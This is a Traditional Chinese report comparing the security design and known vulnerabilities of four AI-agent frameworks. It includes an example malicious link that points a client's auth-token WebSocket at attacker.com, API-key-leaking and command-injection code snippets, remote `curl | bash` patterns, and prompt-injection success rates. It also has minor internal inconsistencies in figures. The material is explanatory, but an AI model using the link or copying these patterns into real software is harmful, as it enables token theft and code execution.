# Claw 家族資安架構分析報告

## 摘要

本報告分析 Claw 家族（OpenClaw、PicoClaw、NemoClaw、IronClaw）在資訊安全方面的架構設計差異。隨著 AI Agent 應用普及，安全性已成為部署的核心考量。各專案採用不同的安全策略：從傳統的應用層防護到零信任架構，適用於不同威脅模型與使用場景。

---

## 一、專案概述與基本資料

| 專案 | 語言 | 程式碼規模 | 定位 | 目標用戶 |
|------|------|------------|------|----------|
| OpenClaw | TypeScript/Node.js | ~430,000 行 | 全功能個人助理 | 一般使用者、開發者 |
| PicoClaw | Go | ~5MB binary | 超輕量嵌入式 | IoT 設備、邊緣運算 |
| NemoClaw | Python/NeMo | 中等 | 企業級安全平台 | 企業、監管機構 |
| IronClaw | Rust | 中等 | 零信任安全優先 | 高安全需求者 |

---

## 二、各專案資安架構詳析

### 2.1 OpenClaw

**安全模型：應用層權限控制**

OpenClaw 採用傳統的應用層檢查機制：
- 允許清單（Allowlist）控制工具執行
- Docker 容器隔離 Tool 執行環境
- 支援 Session 隔離

**已知漏洞：**

| CVE 編號 | 嚴重性 | CVSS | 類型 | 影響版本 |
|----------|--------|------|------|----------|
| CVE-2026-25253 | 嚴重 | 8.8 | WebSocket 驗證權杖竊取導致 RCE | < 2026.1.29 |
| CVE-2026-22177 | 高 | 7.5+ | 環境變數注入導致 RCE | < 2026.2.21 |
| CVE-2026-24763 | 高 | 7.0+ | 命令注入 | 多版本 |
| CVE-2026-25157 | 高 | 7.0+ | 命令注入 | 多版本 |
| CVE-2026-22708 | 中 | 6.0+ | 提示注入綁架瀏覽器 | 多版本 |

**CVE-2026-25253 詳情：**
- **漏洞原理**：Control UI 盲目信任 URL 參數中的 gatewayUrl，自動建立 WebSocket 連接並傳送驗證權杖
- **攻擊手法**：誘使受害者點擊惡意連結（如 `http://localhost/chat?gatewayUrl=ws://attacker.com`）
- **影響**：
  - 40,000+ 暴露實例（Shodan 掃描）
  - 63% 實例可被利用
  - 攻擊者可關閉安全設定並執行任意程式碼

**CVE-2026-22177 詳情：**
- **漏洞原理**：未過濾危險的環境變數（NODE_OPTIONS、LD_PRELOAD 等）
- **攻擊手法**：透過修改設定檔注入惡意環境變數
- **修復**：新增 HostEnvSanitizer 模組阻擋危險變數

**ZeroLeaks 安全評分：**
- 系統提示提取率：84%
- 提示注入成功率：91%
- 安全評分：2/100

**優勢：**
- 5,700+ Skills 生態，彈性高
- 可依使用者/技能細緻調整權限

**劣勢：**
- 龐大程式碼庫難以全面審計
- 依賴使用者自行配置安全設定
- 預設綁定到 0.0.0.0:18789（公開互聯網）
- 缺乏預設密碼保護

---

### 2.2 PicoClaw

**安全模型：輕量級隔離**

專為嵌入式裝置設計：
- Go 語言記憶體安全特性
- 單一二進位檔案（~5MB），減少攻擊面
- 支援 RISC-V、ARM64、x86_64

**部署環境：**
- 32MB RAM 路由器
- 64-128MB IP 攝影機
- $10 RISC-V 開發板

**安全考量：**
- 輕量化代價：犧牲部分安全功能
- 缺乏企業級隔離機制
- 適合低風險場景（ IoT 資料收集、本地控制）

---

### 2.3 NemoClaw

**安全模型：企業級縱深防禦**

NVIDIA 推出的企業解決方案，四層防護：

| 層級 | 元件 | 功能 |
|------|------|------|
| 1 | OpenShell Runtime | 核心隔離沙盒（Landlock + seccomp + netns） |
| 2 | Privacy Router | 資料敏感性分類，決定本地處理或雲端運算 |
| 3 | Nemotron Policy Engine | 120B MoE 意圖分類，政策執行 |
| 4 | Network Guardrails | 預設拒絕網路存取，聲明式 YAML 政策 |

**核心特性：**
- 政策外掛（Out-of-process policy enforcement）
- 敏感資料不出裝置
- 合規稽核支援
- GPU 加速推論

**限制：**
- 目前為 Alpha 預覽版
- 不建議用於生產環境

**已知資安問題：**

| 編號 | 嚴重性 | 描述 | 狀態 |
|------|--------|------|------|
| #579 | 嚴重 | NVIDIA API Key 在程序參數和終端輸出中暴露 | 已公開 |
| #57 | 嚴重 | install.sh 下載並執行遠端腳本而無完整性驗證 | 已修復 |
| #188 | 中高 | auth-profiles.json 檔案權限未正確保護 | 修復中 |
| #177 | 中高 | 外部二進位下載缺少總和驗證 | 修復中 |

**#579 詳情：NVIDIA API Key 暴露漏洞**

這是 NemoClaw 的關鍵資安漏洞，存在於多種情境：

1. **Shell 腳本中的暴露**（walkthrough.sh:72）：
```bash
# 漏洞程式碼：
echo "    export NVIDIA_API_KEY=$NVIDIA_API_KEY"
# 修復後：
echo "    export NVIDIA_API_KEY=\$NVIDIA_API_KEY"
```

2. **程序參數中的暴露**（bin/nemoclaw.js:91）：
```javascript
// 漏洞：API 金鑰以命令列參數傳遞，可被任何本地使用者透過 ps aux 查看
run(`sudo -E NVIDIA_API_KEY="${process.env.NVIDIA_API_KEY}" bash ...`);

// 修復：透過程序環境變數傳遞
run(`sudo -E bash "${SCRIPTS}/setup-spark.sh"`, {
  env: {...process.env, NVIDIA_API_KEY: process.env.NVIDIA_API_KEY}
});
```

3. **openshell provider create 中的暴露**：
```bash
# 漏洞：
openshell provider create --config "NVIDIA_API_KEY=$NVIDIA_API_KEY"

# 建議：使用 --credential-stdin 或環境變數方式
```

**風險評估：**
- **影響範圍**：任何本地使用者可竊取 API 金鑰
- **攻擊面**：所有共享系統
- **後果**：可存取 inference.endpoints.nvidia.com，可能產生費用
- **修補狀態**：截至 2026 年 3 月仍在修復中

**#57 詳情：安裝腳本供應鏈攻擊風險**

install.sh 在執行前未驗證下載腳本的總和驗證：
- nvm 安裝腳本
- Ollama 安裝腳本

攻擊向量：
- CDN 入侵
- BGP 劫持
- DNS 污染

**修復方式**：已新增 verify-checksums.sh 腳本進行總和驗證

**其他已回報的 NemoClaw 資安問題：**

| 編號 | 嚴重性 | CWE | 描述 | 狀態 |
|------|--------|-----|------|------|
| #577 | 高 | CWE-494 | 卸載腳本 fallback 無完整性檢查 | 已公開 |
| #575 | 中 | CWE-78 | deploy() 函數未驗證實例名稱 | 已公開 |
| #573 | 低 | - | telegram-bridge.js 中 API Key 未逸出 | 已公開 |

**#577 詳情：卸載腳本無完整性檢查**
- 當本地卸載腳本不存在時，回退到 `curl | bash` 執行遠端腳本
- 無總和驗證或簽名檢查
- 影響範圍：窄（僅在卸載且無本地腳本時觸發）

**#575 詳情：OS 命令注入**
- `deploy()` 函數接收 `instanceName` 未經驗證直接插入 8 個 shell 命令
- 可利用 `shellQuote()` 修復
- 另外包含 StrictHostKeyChecking=no 等 MITM 風險

**版本資訊：**
- NemoClaw 目前無正式 Release（GitHub 顯示 "No releases published"）
- 本報告基於 2026 年 3 月 GitHub main 分支最新版
- 代號 NemoClaw v2.3 可能指課程版本而非軟體版本

---

### 2.4 IronClaw

**安全模型：零信任 WASM 沙盒**

由 Near AI（Illia Polosukhin 團隊）開發，Rust 實現：

| 層級 | 安全機制 |
|------|----------|
| 網路層 | TLS 1.3、全域加密、SSRF 防護 |
| 請求過濾 | HTTP 端點允許清單、Rate Limiting |
| 沙盒 | WebAssembly 隔離、Capability Token |
| 憑證 | AES-256-GCM 加密、金鑰洩漏掃描 |
| 審計 | 無遙測、完整稽核日誌 |

**設計原則：**
- 假設所有輸入皆為惡意
- 權力極小化（Principle of Least Privilege）
- 可在 TEE（可信執行環境）中運行

**優勢：**
- 記憶體安全（Rust）
- 細粒度能力控制
- 預設拒絕（Default Deny）

---

## 三、威脅模型比較

| 維度 | OpenClaw | PicoClaw | NemoClaw | IronClaw |
|------|-----------|----------|----------|----------|
| 信任邊界 | 應用程式碼 | 作業系統容器 | 5 層縱深防禦 | WASM 沙盒 |
| 攻擊面 | ~400,000 行 | ~5MB binary | 多層次 | Rust + WASM |
| 憑證保護 | Config-based | 基本 | 隱私路由器 | AES-256-GCM |
| 提示注入防禦 | 應用層檢查 | 無 | 政策層阻擋 | 網路層阻擋 |
| RCE 漏洞 | CVE-2026-25253, CVE-2026-22177 | 未知 | 沙盒隔離 | WASM 隔離 |
| 已知 CVE 數量 | 5+ | 0 | 4+ | 0 |
| 安全評分 | 2/100 (ZeroLeaks) | N/A | Alpha（審計中） | N/A |

---

## 四、各專案適用場景

| 專案 | 推薦場景 | 不推薦場景 |
|------|----------|------------|
| OpenClaw | 功能豐富、客製化需求 | 高安全敏感環境 |
| PicoClaw | IoT 閘道、邊緣裝置 | 企業核心系統 |
| NemoClaw | 受監管產業、金融、醫療 | 非企業環境 |
| IronClaw | 處理加密貨幣、API 金鑰 | 輕量需求 |

---

## 五、安全建議

### 通用建議（適用所有 Claw 專案）

1. **網路分段**：隔離 Agent 與主系統
2. **完整日誌**：記錄所有操作
3. **輸出驗證**：確認 Agent 輸出無危害
4. **輸入淨化**：OWASP 標準處理提示注入

### 根據威脅模型的選擇

| 威脅類型 | 建議方案 |
|----------|----------|
| 遠端程式碼執行 | NanoClaw（容器隔離）、NemoClaw |
| 敏感資料外洩 | IronClaw（零信任）、NemoClaw（Privacy Router） |
| 物聯網/邊緣 | PicoClaw（輕量）、ZeroClaw |
| 企業合規 | NemoClaw（內建稽核） |

---

## 六、結論

Claw 家族代表 AI Agent 安全的不同進化方向：

- **OpenClaw**：功能性優先，安全由使用者負責
- **IronClaw**：從零信任原則出發，Rust + WASM
- **NemoClaw**：企業級縱深防禦，基礎設施安全
- **PicoClaw**：輕量嵌入式，犧牲安全換取部署彈性

選擇時應根據：
1. 處理資料的敏感程度
2. 部署環境的硬體限制
3. 合規要求
4. 營運團隊的安全專業能力

---

*報告日期：2026年3月25日*
